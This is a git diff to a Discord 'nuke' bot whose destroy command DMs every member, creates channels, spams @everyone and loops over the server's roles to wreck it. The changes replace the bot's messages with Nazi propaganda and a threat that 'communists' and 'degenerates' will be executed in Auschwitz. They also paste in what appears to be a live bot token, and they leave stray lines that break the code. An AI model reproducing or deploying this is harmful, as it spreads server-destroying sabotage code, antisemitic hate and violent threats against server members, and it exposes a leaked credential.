@@ -119,14 +119,14 @@ async def mall(ctx):
         print("Action completed: Message all")
 #############################
 
-###DESTROY COMMAND####
+!Nuke 
 @client.command(pass_context=True)
 async def destroy(ctx):
     await ctx.message.delete()
     for member in list(client.get_all_members()): 
         await asyncio.sleep(0)
         try:
-            embed = discord.Embed(title="This Is Why You Dont Wanna Give Random People Admin!", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
+            embed = discord.Embed(title="We Will Wipe you all of Discord Glory to the Reich", url="https://github.com/Social404/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
             embed.add_field(
                 name="Discord Server",
                 value=
@@ -143,7 +143,8 @@ async def destroy(ctx):
                 "[ [ Click here ] ](https://github.com/social404)",
                 inline=False)
             embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
-            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
+            embed.set_footer(text="This Server has been liberated by the reich
+            ")
             await member.send(embed=embed)
         except:
             pass
@@ -155,8 +156,8 @@ async def destroy(ctx):
         except:
             pass
         guild = ctx.message.guild
-        channel = await guild.create_text_channel("Nuked By Social's Bot! Check Dms")
-        await channel.send(" @everyone GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right?")
+        channel = await guild.create_text_channel("Occupied Territory")
+        await channel.send("https://cdn.discordapp.com/attachments/903861968815943730/904085332012699689/VID_66901031_055447_074.mp4@everyone This Server is Occupied by the reich if you are a communist pig or degnerate await to be executed in Auschwitz")
         await channel.send(embed=embed)
     for role in list(ctx.guild.roles):
         try:
@@ -212,4 +213,4 @@ keep_alive.keep_alive()
 
 
 client.run(token)
-# Place your Bot's token here
+OTA0MDc4NDIzMTYzNTU1OTIy.YX2SpQ.abAC9kAHJuzf01K8vQxkBpDagDU
